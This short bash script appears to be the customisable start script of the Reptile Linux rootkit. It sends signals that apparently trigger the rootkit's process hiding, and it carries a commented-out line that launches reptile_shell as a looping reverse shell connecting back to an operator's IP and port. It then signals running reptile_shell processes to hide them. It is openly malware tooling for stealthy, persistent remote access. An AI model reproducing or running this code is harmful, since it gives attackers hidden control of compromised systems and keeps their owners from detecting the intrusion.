#!/bin/bash
#
# You can customize it!

kill -50 0

# Uncomment this line and set the paramethers if you want to spawn
# reptile_shell as a loop that will connect to your host each time
#
# /reptile/reptile_shell -t <ip> -p <port> -r <time in seconds>

kill -49 `ps -ef | grep reptile_shell | grep -v grep | awk '{print $2}'`
